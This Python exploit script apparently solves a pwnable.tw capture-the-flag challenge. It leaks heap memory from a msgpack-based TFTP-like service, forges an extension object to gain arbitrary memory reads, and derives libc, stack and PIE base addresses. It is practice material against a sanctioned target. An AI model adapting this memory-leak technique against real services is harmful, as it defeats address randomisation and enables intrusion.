#!/usr/bin/env python3

import re
import socket
import struct
import time

import msgpack


HOST = "chall.pwnable.tw"
TCP_PORT = 10309
REQUEST_DELTA = 0x13B10
IO_FILE_JUMPS = 0x3E82A0
ENVIRON = 0x3EE098
INIT_REQS = 0x20D060


def get_udp_port():
    io = socket.create_connection((HOST, TCP_PORT), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", 0))
    s.settimeout(5)
    return s


def send_recv(sock, udp_port, pkt):
    raw = msgpack.packb(pkt, use_bin_type=True)
    sock.sendto(raw, (HOST, udp_port))
    data, _ = sock.recvfrom(65535)
    return msgpack.unpackb(data, raw=True, strict_map_key=False)


def extra_key(pkt, known):
    if not isinstance(pkt, list) or pkt[0] != 6 or not isinstance(pkt[1], dict):
        return None
    for k in pkt[1]:
        if k not in known:
            return k
    return None


def leak_req(sock, udp_port):
    options = {f"k{i:04d}": i for i in range(20)}
    send_recv(sock, udp_port, [2, "x", "octet", options, 0])
    time.sleep(0.05)
    pkt = send_recv(sock, udp_port, [2, "x", "octet", ["pad", 1], 0])
    k = extra_key(pkt, {b"pad", "pad"})
    if not isinstance(k, (bytes, bytearray)) or len(k) != 5:
        raise RuntimeError(f"heap leak failed: {pkt!r}")
    heap_base = int.from_bytes(k, "little") << 8
    req = heap_base + REQUEST_DELTA
    return heap_base, req


def build_fake_ext(ptr, size, value=1):
    fake = bytearray(0x30)
    struct.pack_into("<I", fake, 0x00, 5)
    struct.pack_into("<Q", fake, 0x08, size)
    struct.pack_into("<Q", fake, 0x10, ptr)
    struct.pack_into("<I", fake, 0x18, 2)
    struct.pack_into("<Q", fake, 0x20, value)
    return msgpack.ExtType(1, bytes(fake))


def arb_read(sock, udp_port, addr, size=8):
    for _ in range(3):
        try:
            pkt = send_recv(sock, udp_port, [2, "x", "octet", build_fake_ext(addr, size), 0])
            k = extra_key(pkt, {b"tsize", "tsize"})
            if k is None:
                continue
            if isinstance(k, str):
                k = k.encode()
            return bytes(k)
        except Exception:
            pass
    return b""


def leak_ptr(sock, udp_port, addr):
    return int.from_bytes(arb_read(sock, udp_port, addr, 8).ljust(8, b"\x00"), "little")


def main():
    io, udp_port = get_udp_port()
    print(f"udp_port={udp_port}")

    a = make_udp()
    b = make_udp()
    print(f"a_local={a.getsockname()[1]}")
    print(f"b_local={b.getsockname()[1]}")

    a_heap, _ = leak_req(a, udp_port)
    leak_req(b, udp_port)
    req0 = a_heap + REQUEST_DELTA
    file0 = leak_ptr(a, udp_port, req0 + 0x110)
    libc_base = leak_ptr(a, udp_port, file0 + 0xD8) - IO_FILE_JUMPS
    envp = leak_ptr(a, udp_port, libc_base + ENVIRON)

    vals = [leak_ptr(a, udp_port, envp + i * 8) for i in range(24)]
    pie_base = None
    for i in range(len(vals) - 1):
        if vals[i] == 3 and vals[i + 1] > 0x500000000000:
            pie_base = vals[i + 1] - 0x40
            break
    if pie_base is None:
        raise RuntimeError("failed to derive pie base")

    init_reqs = [leak_ptr(a, udp_port, pie_base + INIT_REQS + i * 8) for i in range(4)]
    print(f"heap_base=0x{a_heap:x}")
    print(f"req0_guess=0x{req0:x}")
    print(f"file0=0x{file0:x}")
    print(f"libc_base=0x{libc_base:x}")
    print(f"envp=0x{envp:x}")
    print(f"pie_base=0x{pie_base:x}")
    for i, ptr in enumerate(init_reqs):
        if ptr:
            fp = leak_ptr(a, udp_port, ptr + 0x110)
            print(f"init_reqs[{i}] = 0x{ptr:x} file=0x{fp:x}")
    live = [x for x in init_reqs if x]
    if len(live) >= 2:
        print(f"delta req[1]-req[0] = 0x{live[1]-live[0]:x}")

    io.close()
    a.close()
    b.close()


if __name__ == "__main__":
    main()
